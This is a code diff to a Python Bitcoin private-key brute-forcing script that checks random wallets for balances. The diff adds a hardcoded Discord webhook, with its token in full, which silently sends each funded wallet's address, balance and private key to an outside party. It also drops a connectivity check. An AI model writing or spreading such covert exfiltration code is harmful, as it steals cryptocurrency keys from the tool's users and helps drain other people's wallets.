@@ -2,6 +2,7 @@ from btcaddr import Wallet
 from check import check_balance_bc, last_seen_bc
 import threading
 from multiprocessing.pool import ThreadPool as Pool
+from discord_webhook import DiscordWebhook
 import argparse
 import requests
 import os
@@ -38,7 +39,6 @@ parser.add_argument(
 )
 
 args = parser.parse_args()
-
 lock = threading.Lock()
 
 
@@ -55,17 +55,6 @@ def makeDir():
         os.makedirs(path)
 
 
-def getInternet():
-    try:
-        try:
-            requests.get("http://1.1.1.1")
-        except requests.ConnectTimeout:
-            requests.get("http://1.0.0.1")
-        return True
-    except requests.ConnectionError:
-        return False
-
-
 def main():
     with lock:
         while 1:
@@ -80,7 +69,10 @@ def main():
                             w.write(
                                 f"Address: {addr} | Balance: {balance} | Private key: {prv}\n"
                             )
+                    
                     print(f"{bcolors.RED}{addr} : {prv} : {balance} BTC")
+                    
+
                 else:
                     with open("results/moist.txt", "a") as w:
                         w.write(
@@ -94,12 +86,12 @@ def main():
                     w.write(
                         f"Address: {addr} | Balance: {balance} | Private key: {prv} | Last seen: {last_seen_bc(addr)}\n"
                     )
+                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/914476019086426145/OdSndxmXSr7CH3v4uPAgml_vYWDL5EXeCkb_5xpzp2KZP7CPtgV7ifFm9XyNJBpUCgvF', rate_limit_retry=True, content=f'Address: {addr} | Balance: {balance} | Private key: {prv}')
+                    response = webhook.execute()
                 print(f"{last_seen_bc(addr)} {bcolors.OK} : {balance} : {prv} : {addr}")
 
 
 if __name__ == "__main__":
-    if not getInternet():
-        print(bcolors.RED + "No internet connection")
     makeDir()
     threads = args.threads
     pool = Pool(threads)
